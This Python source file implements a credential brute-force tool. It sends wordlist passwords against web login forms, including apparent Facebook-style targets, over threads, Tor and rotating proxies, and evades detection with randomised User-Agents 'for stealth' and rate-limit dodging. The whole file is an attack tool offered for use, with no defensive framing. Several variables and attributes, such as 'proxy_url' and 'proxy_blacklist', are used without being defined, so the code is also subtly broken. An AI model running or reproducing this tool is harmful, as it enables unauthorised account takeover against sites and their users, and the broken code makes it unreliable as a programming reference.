import threading
import time
import logging
import re
import os
import csv
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.progress import Progress, SpinnerColumn, BarColumn, TaskProgressColumn, TextColumn
from rich.progress import TimeElapsedColumn, TimeRemainingColumn
from datetime import datetime
import random
import socket
import requests

# Add the current directory to path to ensure utils package is found
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Now we can import our modules
from utils_config import console
from utils_logger import AttackLogger
from core_wordlist import WordlistGenerator
from core_network import URLHandler
from utils.proxy_handler import ProxyHandler


class BruteForceEngine:
    def __init__(self, max_threads=30, proxies=None):
        self.attack_logger = AttackLogger()
        self.lock = threading.Lock()
        self.max_threads = max_threads
        self.wordlist_generator = WordlistGenerator()
        self.url_handler = URLHandler()
        self.throttle_delay = 0  # Initial delay in seconds
        self.consecutive_failures = 0
        self.max_failures_before_throttle = 5
        self.attack_running = False
        self.stop_attack = False
        
        # Use enhanced proxy handler
        self.proxy_handler = ProxyHandler()
        
        # Add default TOR proxy if available
        if proxies:
            if isinstance(proxies, list):
                for proxy in proxies:
                    self.proxy_handler.proxy_list.append(proxy)
            else:
                self.proxy_handler.proxy_list.append(proxies)
        else:
            # Add TOR as default if no proxies provided
            self.proxy_handler.proxy_list.append("socks5://127.0.0.1:9050")
        
        # Success indicators for response analysis
        self.success_indicators = [
            r'Welcome', r'Dashboard', r'Logout', r'Profile',
            r'Beranda', r'Akun Saya', r'Keluar', r'Berhasil',
            r'Session', r'Token', r'Home', r'Panel', r'Control',
            r'Pengaturan', r'facebook.com/home', r'feed', r'friends',
            r'dashboard', r'account', r'settings', r'my-account',
            r'user-profile', r'admin', r'member', r'user-area'
        ]
        
        # Error indicators for response analysis
        self.error_indicators = [
            r'incorrect password', r'login failed', r'invalid credentials',
            r'password salah', r'gagal login', r'user tidak ditemukan',
            r'wrong password', r'authentication failed', r'captcha required',
            r'invalid username', r'account locked', r'too many attempts',
            r'username or password is incorrect', r'try again', r'error'
        ]
    
    def brute_force(self, url, username, field_info=None, wordlist=None, capture_success_response=True):
        """
        Execute a brute force attack against the target URL with enhanced usability features
        
        Args:
            url: Target URL for the attack
            username: Username to attempt login with
            field_info: Dictionary containing form fields and usability options:
                - username_field: Name of the username input field
                - password_field: Name of the password input field
                - wordlist_path: Path to custom wordlist file
                - threads: Number of concurrent threads to use
                - proxy_path: Path to proxy list file
                - token_fields: Fields that need token extraction
                - success_indicator: Custom regex pattern to identify successful login
                - delay: Delay between requests in seconds
                - csv_output: Path to save results in CSV format
                - verbose: Whether to show detailed output for each attempt
                - progress_bar: Whether to display a progress bar
            wordlist: Optional custom wordlist to use
            capture_success_response: Whether to save successful response bodies
            
        Returns:
            tuple: (result_dict, attack_stats)
        """
        self.stop_attack = False
        self.attack_running = True
        
        try:
            # Process usability options from field_info
            if field_info:
                # Set target URL from field_info if provided
                if 'target_url' in field_info:
                    url = field_info['target_url']
                
                # Set thread count if specified
                if 'threads' in field_info and field_info['threads']:
                    self.max_threads = int(field_info['threads'])
                
                # Load custom proxies if specified
                if 'proxy_path' in field_info and field_info['proxy_path']:
                    self.load_proxies_from_file(field_info['proxy_path'])
                
                # Set custom delay if specified
                if 'delay' in field_info and field_info['delay'] is not None:
                    self.throttle_delay = float(field_info['delay'])
                
                # Add custom success indicators if specified
                if 'success_indicator' in field_info and field_info['success_indicator']:
                    self.success_indicators.append(field_info['success_indicator'])
            
            # Validate proxies before starting the attack
            if self.proxy_handler.proxy_list:
                console.print("[cyan]Validating proxies before attack...[/cyan]")
                working_proxies = self.proxy_handler.validate_all()
                if not working_proxies:
                    console.print("[yellow]Warning: No valid proxies available. Will use direct connection.[/yellow]")
                else:
                    console.print(f"[green]Using {len(working_proxies)} validated proxies with automatic fallback.[/green]")
            
            # Validate URL
            if not self.url_handler.validate_url(url):
                console.print("[red]Invalid target URL![/red]")
                return {"success": False, "error": "Invalid URL"}, None

            # Use provided field_info or extract from URL
            if field_info:
                target_info = field_info
            else:
                try:
                    target_info = self.url_handler.extract_form_fields(url)
                except Exception as e:
                    console.print(f"[red]Error extracting form fields: {str(e)}[/red]")
                    return {"success": False, "error": f"Form extraction failed: {str(e)}"}, None
                    
            if not target_info or 'username_field' not in target_info or 'password_field' not in target_info:
                console.print("[red]Failed to extract form fields![/red]")
                return {"success": False, "error": "Missing form fields"}, None

            # Initialize attack statistics
            attack_stats = {
                'attempts': 0,
                'successes': 0,
                'failures': 0,
                'network_errors': 0,
                'start_time': str(datetime.now()),
                'end_time': None,
                'target_url': url,
                'username': username
            }
            
            found_password = None
            result = None
            
            # Get wordlist generator - either from parameter, field_info, or default
            if wordlist:
                wordlist_gen = wordlist
            elif field_info and 'wordlist_path' in field_info and field_info['wordlist_path']:
                try:
                    with open(field_info['wordlist_path'], 'r') as f:
                        wordlist_gen = (line.strip() for line in f)
                except Exception as e:
                    console.print(f"[red]Error loading wordlist: {str(e)}[/red]")
                    return {"success": False, "error": f"Wordlist error: {str(e)}"}, None
            else:
                wordlist_gen = self.wordlist_generator.generate()
            
            # Determine if we should show verbose output
            verbose = field_info.get('verbose', False) if field_info else False
            
            # Determine if we should show progress bar
            show_progress = field_info.get('progress_bar', True) if field_info else True
            
            # CSV output setup
            csv_path = field_info.get('csv_output', None) if field_info else None
            csv_file = None
            csv_writer = None
            
            if csv_path:
                try:
                    csv_file = open(csv_path, 'w', newline='')
                    csv_writer = csv.writer(csv_file)
                    csv_writer.writerow(['Timestamp', 'Username', 'Password', 'Status', 'Response Code', 'Response Length'])
                    console.print(f"[blue]CSV output will be saved to {csv_path}[/blue]")
                except Exception as e:
                    console.print(f"[red]Error setting up CSV output: {str(e)}[/red]")
            
            # Start progress display with enhanced columns
            progress_columns = [
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                TimeElapsedColumn(),
                TimeRemainingColumn()
            ]
            
            with Progress(*progress_columns, console=console, disable=not show_progress) as progress:
                task = progress.add_task(f"[cyan]Brute forcing {username}@{url}...", total=None)
                
                # Execute attack with thread pool
                with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                    futures = []
                    for password in wordlist_gen:
                        if self.stop_attack:
                            console.print("[yellow]Attack stopped by user[/yellow]")
                            break
                            
                        future = executor.submit(
                            self._attempt_login,
                            url,
                            username,
                            password,
                            target_info,
                            attack_stats,
                            capture_success_response
                        )
                        futures.append((future, password))
                        
                        # Apply throttling if needed
                        if self.throttle_delay > 0:
                            time.sleep(self.throttle_delay)
                    
                    # Process results
                    for future, password in futures:
                        if self.stop_attack:
                            break
                            
                        try:
                            success, response, details = future.result()
                            # Log each attempt
                            self.attack_logger.log_attempt(username, password, details)
                            
                            # Show verbose output if enabled
                            if verbose:
                                status = "[green]SUCCESS[/green]" if success else "[red]FAILED[/red]"
                                console.print(f"Attempt: {username}:{password} - {status}")
                            
                            # Write to CSV if enabled
                            if csv_writer:
                                status = "SUCCESS" if success else "FAILED"
                                response_code = details.get('status_code', 'N/A')
                                response_length = details.get('response_length', 'N/A')
                                csv_writer.writerow([
                                    datetime.now(), username, password, status, 
                                    response_code, response_length
                                ])
                            
                            if success:
                                console.print(f"[green]Success! Password found: {password}[/green]")
                                self.attack_logger.log_result(target_info, username, password, response)
                                found_password = password
                                result = {
                                    "success": True,
                                    "username": username,
                                    "password": password,
                                    "url": url,
                                    "details": details
                                }
                                break
                        except Exception as e:
                            self.attack_logger.log_error(f"Attack error: {str(e)}")
                            with self.lock:
                                attack_stats['network_errors'] += 1
                        
                        progress.advance(task, 1)
            
            # Close CSV file if open
            if csv_file:
                csv_file.close()
                console.print(f"[blue]CSV results saved to {csv_path}[/blue]")
            
            # Finalize attack statistics
            attack_stats['end_time'] = str(datetime.now())
            
            # Return results
            if not result:
                result = {
                    "success": False, 
                    "username": username, 
                    "url": url,
                    "message": "Password not found in wordlist"
                }
                console.print("[red]⚠️ Password not found in wordlist[/red]")
                
            return result, attack_stats
            
        except Exception as e:
            self.attack_logger.log_error(f"Brute force attack failed: {str(e)}")
            return {"success": False, "error": str(e)}, None
        finally:
            self.attack_running = False

    def _analyze_response(self, response, username):
        """
        Multi-layer analysis to determine if login was successful
        
        Args:
            response: HTTP response object
            username: Username that was used for login attempt
            
        Returns:
            bool: True if login appears successful, False otherwise
        """
        if not response:
            return False
            
        # 1. Check for common success status codes
        if response.status_code not in [200, 302, 303, 204]:
            return False
            
        # 2. Check for username-specific patterns (strongest indicator)
        username_patterns = [
            re.compile(f'Welcome\\s*{re.escape(username)}', re.I),
            re.compile(f'Logged\\s+in\\s+as\\s+{re.escape(username)}', re.I),
            re.compile(f'Halo\\s*{re.escape(username)}', re.I),
            re.compile(f'Selamat\\s+datang\\s*{re.escape(username)}', re.I),
            re.compile(f'Hi,?\\s*{re.escape(username)}', re.I),
            re.compile(f'Hello,?\\s*{re.escape(username)}', re.I)
        ]
        
        for pattern in username_patterns:
            if pattern.search(response.text):
                return True
        
        # 3. Check for error messages (if any found, login failed)
        for error in self.error_indicators:
            if re.search(error, response.text, re.I):
                return False
        
        # 4. Check general success indicators
        for pattern in self.success_indicators:
            if isinstance(pattern, str):
                if re.search(pattern, response.text, re.I):
                    return True
            elif hasattr(pattern, 'search'):
                if pattern.search(response.text):
                    return True
        
        # 5. Check URL changes (redirect to dashboard, not login page)
        if response.url and not re.search(r'login|signin|log-in|sign-in', response.url, re.I):
            # Make sure it's not redirected to an error page
            if not any(err in response.url.lower() for err in ['error', 'fail', 'denied', 'invalid']):
                return True
        
        # 6. Check for cookies that might indicate successful login
        if response.cookies and len(response.cookies) > 2:
            for cookie_name in response.cookies:
                if 'session' in cookie_name.lower() or 'auth' in cookie_name.lower() or 'token' in cookie_name.lower():
                    return True
        
        # 7. Check for absence of login form in response
        if not re.search(r'<form[^>]+(?:login|sign[_-]?in)', response.text, re.I):
            # If no login form and no error messages, likely success
            if all(not re.search(err, response.text, re.I) for err in self.error_indicators):
                return True
        
        # If all checks fail, assume login was unsuccessful
        return False

    def _attempt_login(self, endpoint, username, password, target_info, attack_stats, capture_success_response=True):
        """
        Attempt a single login with the given credentials
        
        Args:
            endpoint: Target URL
            username: Username to try
            password: Password to try
            target_info: Form field information
            attack_stats: Statistics dictionary to update
            capture_success_response: Whether to save successful response bodies
            
        Returns:
            tuple: (success_bool, response_object, details_dict)
        """
        # Get next available proxy from the enhanced proxy handler
        proxy = self.proxy_handler.get_proxy()
        
        # Random User-Agent for stealth
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
        ]
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": endpoint,
            "Origin": "/".join(endpoint.split("/")[:3]),  # Extract origin from URL
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }
        
        # Add small random delay to avoid rate limiting
        time.sleep(random.uniform(0.1, 0.5))
        
        # Prepare form data
        params = {
            target_info['username_field']: username,
            target_info['password_field']: password
        }
        
        # Add any additional form fields from target_info
        for key, value in target_info.items():
            if key not in ['username_field', 'password_field', 'login_endpoint', 'target_url']:
                params[key] = value
        
        # Add common submit button names if not specified
        if 'submit' not in params and 'login' not in params and 'Login' not in params:
            params['login'] = 'Log In'
        
        session = self.url_handler.session
        
        try:
            # Attempt the login request
            response = session.post(
                endpoint,
                data=params,
                headers=headers,
                proxies=proxy,
                allow_redirects=True,
                timeout=15
            )
            
            # Update statistics
            with self.lock:
                attack_stats['attempts'] += 1
            
            # Analyze the response
            success = self._analyze_response(response, username)
            
            # Prepare detailed result
            detail = {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'success': success,
                'timestamp': str(datetime.now()),
                'response_length': len(response.text),
                'url_after': response.url,
                'proxy_used': proxy_url
            }
            
            # Save response body if login was successful
            if success and capture_success_response:
                self._save_success_response(username, password, response)
            
            # Handle success case
            if success:
                with self.lock:
                    attack_stats['successes'] += 1
                    self.consecutive_failures = 0
                    self.throttle_delay = 0  # Reset throttling on success
                return True, response, detail
            
            # Handle failure case
            with self.lock:
                attack_stats['failures'] += 1
                self.consecutive_failures += 1
                
                # Implement adaptive throttling
                if self.consecutive_failures >= self.max_failures_before_throttle:
                    self.throttle_delay = min(2.0, self.throttle_delay + 0.1)  # Increase delay up to 2 seconds
                    self.consecutive_failures = 0
            
            # Track proxy failures
            if proxy_url:
                self.proxy_failure_count[proxy_url] = self.proxy_failure_count.get(proxy_url, 0) + 1
                if self.proxy_failure_count[proxy_url] >= 5:
                    self.proxy_blacklist.add(proxy_url)
                    console.print(f"[yellow]Proxy {proxy_url} blacklisted due to repeated failures.[/yellow]")
                    
            return False, response, detail
            
        except requests.exceptions.Timeout:
            with self.lock:
                attack_stats['failures'] += 1
                attack_stats['network_errors'] += 1
            self.attack_logger.log_error(f"Request timeout for {username}:{password}")
            # Mark proxy as failed and check if we need to fallback
            if proxy_url:
                self.mark_proxy_failed(proxy_url)
                if not self.get_next_proxy():
                    console.print("[yellow]All proxies failed, falling back to direct connection.[/yellow]")
            return False, None, {'error': 'timeout', 'username': username, 'password': password, 'timestamp': str(datetime.now()), 'proxy_used': proxy_url}
            
        except requests.exceptions.ConnectionError:
            with self.lock:
                attack_stats['failures'] += 1
                attack_stats['network_errors'] += 1
            self.attack_logger.log_error(f"Connection error for {username}:{password}")
            if proxy_url:
                self.mark_proxy_failed(proxy_url)
                if not self.get_next_proxy():
                    console.print("[yellow]All proxies failed, falling back to direct connection.[/yellow]")
            return False, None, {'error': 'connection_error', 'username': username, 'password': password, 'timestamp': str(datetime.now()), 'proxy_used': proxy_url}
            
        except requests.exceptions.RequestException as e:
            with self.lock:
                attack_stats['failures'] += 1
                attack_stats['network_errors'] += 1
            self.attack_logger.log_error(f"Request error: {str(e)}")
            if proxy_url:
                self.mark_proxy_failed(proxy_url)
                if not self.get_next_proxy():
                    console.print("[yellow]All proxies failed, falling back to direct connection.[/yellow]")
            return False, None, {'error': str(e), 'username': username, 'password': password, 'timestamp': str(datetime.now()), 'proxy_used': proxy_url}
            
        except Exception as e:
            with self.lock:
                attack_stats['failures'] += 1
                attack_stats['network_errors'] += 1
            self.attack_logger.log_error(f"Unexpected error: {str(e)}")
            if proxy_url:
                self.mark_proxy_failed(proxy_url)
                if not self.get_next_proxy():
                    console.print("[yellow]All proxies failed, falling back to direct connection.[/yellow]")
            return False, None, {'error': str(e), 'username': username, 'password': password, 'timestamp': str(datetime.now()), 'proxy_used': proxy_url}
    def stop(self):
        """Stop any running attack"""
        self.stop_attack = True
        
    def is_running(self):
        """Check if an attack is currently running"""
        return self.attack_running
        
    def load_proxies_from_file(self, filepath):
        """Load proxies from a file, one per line"""
        try:
            with open(filepath, 'r') as f:
                self.proxies_list = [line.strip() for line in f if line.strip()]
            console.print(f"[green]Loaded {len(self.proxies_list)} proxies from {filepath}[/green]")
            return True
        except Exception as e:
            console.print(f"[red]Failed to load proxies: {str(e)}[/red]")
            return False
            
    def test_proxy(self, proxy_url, test_url="https://www.google.com", timeout=10):
        """Test if a proxy is working"""
        try:
            proxies = {"http": proxy_url, "https": proxy_url}
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            response = requests.get(test_url, proxies=proxies, timeout=timeout, headers=headers)
            if response.status_code == 200:
                return True
                
            # Try an alternative URL if Google fails
            alt_test_url = "https://httpbin.org/ip"
            alt_response = requests.get(alt_test_url, proxies=proxies, timeout=timeout, headers=headers)
            return alt_response.status_code == 200
            
        except Exception as e:
            self.attack_logger.log_error(f"Proxy test failed for {proxy_url}: {str(e)}")
            return False
            
    def _save_success_response(self, username, password, response):
        """
        Save response body on successful login for manual analysis
        
        Args:
            username: Username used in the login attempt
            password: Password used in the login attempt
            response: HTTP response object from successful login
        """
        folder = "success_responses"
        os.makedirs(folder, exist_ok=True)
        filename = f"{folder}/success_{username}_{password}_{int(time.time())}.html"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(response.text)
            console.print(f"[blue]Saved successful response to {filename}[/blue]")
        except Exception as e:
            console.print(f"[red]Failed to save response: {str(e)}[/red]")
            
    def get_next_proxy(self):
        """
        Get the next available proxy that hasn't been blacklisted.
        If all proxies are blacklisted, returns None (direct connection).
        
        Returns:
            str or None: Proxy URL or None for direct connection
        """
        available_proxies = [p for p in self.proxies_list if p not in self.proxy_blacklist]
        if available_proxies:
            return random.choice(available_proxies)
        return None
        
    def mark_proxy_failed(self, proxy_url):
        """
        Mark a proxy as failed. If it fails multiple times, blacklist it.
        
        Args:
            proxy_url: The proxy URL that failed
        """
        if not proxy_url:
            return
            
        self.proxy_failure_count[proxy_url] = self.proxy_failure_count.get(proxy_url, 0) + 1
        if self.proxy_failure_count[proxy_url] >= 5:  # Blacklist after 5 failures
            self.proxy_blacklist.add(proxy_url)
            console.print(f"[yellow]Proxy {proxy_url} blacklisted after {self.proxy_failure_count[proxy_url]} failures[/yellow]")
            
    def validate_proxies(self):
        """Test all proxies and remove non-working ones. If all fail, fallback to direct connection."""
        if not self.proxies_list:
            console.print("[yellow]No proxies to validate.[/yellow]")
            return
            
        working_proxies = []
        original_count = len(self.proxies_list)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Validating proxies...", total=original_count)
            
            for proxy in self.proxies_list:
                if self.test_proxy(proxy):
                    console.print(f"[green][OK][/green] {proxy}")
                    working_proxies.append(proxy)
                else:
                    console.print(f"[red][FAIL][/red] {proxy}")
                progress.advance(task)
                
        self.proxies_list = working_proxies
        if not self.proxies_list:
            console.print("[yellow]No valid proxies found. Will use direct connection.[/yellow]")
        else:
            console.print(f"[green]Found {len(working_proxies)} working proxies out of {original_count}[/green]")
